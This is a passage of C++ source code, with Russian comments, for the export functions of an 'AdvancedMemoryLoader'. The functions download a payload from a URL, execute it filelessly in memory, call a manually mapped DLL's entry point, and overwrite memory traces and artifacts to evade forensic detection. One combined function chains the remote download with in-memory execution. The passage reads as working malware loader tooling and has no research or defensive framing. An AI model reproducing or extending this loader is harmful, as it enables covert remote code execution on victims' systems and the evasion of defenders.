            // Execute as DLL entry point
            typedef BOOL (WINAPI *DllEntryProc)(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
            DllEntryProc dllEntry = (DllEntryProc)entryPoint;
            
            BOOL result = dllEntry((HINSTANCE)g_loader.get(), DLL_PROCESS_ATTACH, nullptr);
            
            return result == TRUE;
        } catch (...) {
            LogError("Exception during PE execution");
            return false;
        }
    }
    
    // =======================================================================
    // AdvancedMemoryLoader Export Functions - Экспорт функций для продвинутого загрузчика
    // =======================================================================
    
    bool InitAdvancedMemoryLoader() {
        try {
            if (!g_advancedLoader) {
                g_advancedLoader = std::make_unique<AdvancedMemoryLoader>();
                LogInfo("AdvancedMemoryLoader инициализирован успешно");
                return true;
            }
            return true; // Уже инициализирован
        } catch (const std::exception& e) {
            LogError(("Ошибка инициализации AdvancedMemoryLoader: " + std::string(e.what())).c_str());
            return false;
        } catch (...) {
            LogError("Неизвестная ошибка инициализации AdvancedMemoryLoader");
            return false;
        }
    }
    
    bool LoadPayloadFromURL(const char* url) {
        if (!g_advancedLoader) {
            LogError("AdvancedMemoryLoader не инициализирован");
            return false;
        }
        
        if (!url || strlen(url) == 0) {
            LogError("Пустой URL для загрузки");
            return false;
        }
        
        try {
            LogInfo(("Загрузка payload из URL: " + std::string(url)).c_str());
            return g_advancedLoader->LoadFromURL(std::string(url));
        } catch (const std::exception& e) {
            LogError(("Исключение при загрузке из URL: " + std::string(e.what())).c_str());
            return false;
        } catch (...) {
            LogError("Неизвестное исключение при загрузке из URL");
            return false;
        }
    }
    
    bool ExecutePayloadFileless(const void* payload, size_t size) {
        if (!g_advancedLoader) {
            LogError("AdvancedMemoryLoader не инициализирован");
            return false;
        }
        
        if (!payload || size == 0) {
            LogError("Невалидный payload для fileless выполнения");
            return false;
        }
        
        try {
            std::vector<uint8_t> payloadData(static_cast<const uint8_t*>(payload), 
                                           static_cast<const uint8_t*>(payload) + size);
            
            LogInfo(("Fileless выполнение payload размером: " + std::to_string(size) + " байт").c_str());
            return g_advancedLoader->ExecuteFilelessPayload(payloadData);
        } catch (const std::exception& e) {
            LogError(("Исключение при fileless выполнении: " + std::string(e.what())).c_str());
            return false;
        } catch (...) {
            LogError("Неизвестное исключение при fileless выполнении");
            return false;
        }
    }
    
    bool CreateProcessInMemoryOnly() {
        if (!g_advancedLoader) {
            LogError("AdvancedMemoryLoader не инициализирован");
            return false;
        }
        
        try {
            LogInfo("Создание процесса только в памяти");
            return g_advancedLoader->CreateMemoryOnlyProcess();
        } catch (const std::exception& e) {
            LogError(("Исключение при создании memory-only процесса: " + std::string(e.what())).c_str());
            return false;
        } catch (...) {
            LogError("Неизвестное исключение при создании memory-only процесса");
            return false;
        }
    }
    
    void CleanupMemoryArtifacts() {
        if (g_advancedLoader) {
            try {
                LogInfo("Очистка артефактов памяти");
                g_advancedLoader->ClearMemoryArtifacts();
            } catch (const std::exception& e) {
                LogError(("Исключение при очистке артефактов: " + std::string(e.what())).c_str());
            } catch (...) {
                LogError("Неизвестное исключение при очистке артефактов");
            }
        }
    }
    
    void OverwriteMemoryTraces() {
        if (g_advancedLoader) {
            try {
                LogInfo("Затирание следов в памяти");
                g_advancedLoader->OverwriteFreedMemory();
            } catch (const std::exception& e) {
                LogError(("Исключение при затирании памяти: " + std::string(e.what())).c_str());
            } catch (...) {
                LogError("Неизвестное исключение при затирании памяти");
            }
        }
    }
    
    void ShutdownAdvancedMemoryLoader() {
        if (g_advancedLoader) {
            try {
                LogInfo("Завершение работы AdvancedMemoryLoader");
                
                // Очищаем все артефакты перед завершением
                g_advancedLoader->ClearMemoryArtifacts();
                g_advancedLoader->OverwriteFreedMemory();
                
                // Уничтожаем экземпляр
                g_advancedLoader.reset();
                
                LogInfo("AdvancedMemoryLoader завершен успешно");
            } catch (const std::exception& e) {
                LogError(("Исключение при завершении AdvancedMemoryLoader: " + std::string(e.what())).c_str());
            } catch (...) {
                LogError("Неизвестное исключение при завершении AdvancedMemoryLoader");
            }
        }
    }
    
    // Комбинированная функция: загрузка из URL + fileless выполнение
    bool LoadAndExecuteFromURL(const char* url) {
        if (!InitAdvancedMemoryLoader()) {
            LogError("Не удалось инициализировать AdvancedMemoryLoader");
            return false;
        }
        
        if (!LoadPayloadFromURL(url)) {
            LogError("Не удалось загрузить payload из URL");
            return false;
        }
        
        LogInfo("Payload загружен успешно, переходим к fileless выполнению");
        
        // Для fileless выполнения нам нужен сам payload, а не URL
        // Поэтому здесь используем CreateMemoryOnlyProcess который работает с уже загруженными данными
        return CreateProcessInMemoryOnly();
    }
    
    // Функция для получения статистики работы AdvancedMemoryLoader
    bool GetMemoryLoaderStats(char* buffer, int bufferSize) {
        if (!buffer || bufferSize <= 0) {
            LogError("Невалидный буфер для статистики");
            return false;
        }
        
        try {
            std::string stats = "AdvancedMemoryLoader Statistics:\n";
            stats += "- Status: " + std::string(g_advancedLoader ? "Active" : "Inactive") + "\n";
            
            if (g_advancedLoader) {
                stats += "- Memory-only processes: Active\n";
                stats += "- Artifacts cleanup: Available\n";
                stats += "- Network loading: " + std::string(
#ifdef MODULE_NETWORK_ENABLED
                    "Enabled (Secure)"
#else
                    "Enabled (Fallback)"
#endif
                ) + "\n";
            }
            
            if (stats.length() < static_cast<size_t>(bufferSize)) {
                strcpy_s(buffer, bufferSize, stats.c_str());
                return true;
            } else {
                LogError("Буфер слишком мал для статистики");
                return false;
            }
        } catch (const std::exception& e) {
            LogError(("Исключение при получении статистики: " + std::string(e.what())).c_str());
            return false;
        } catch (...) {
            LogError("Неизвестное исключение при получении статистики");
            return false;
        }
    }
}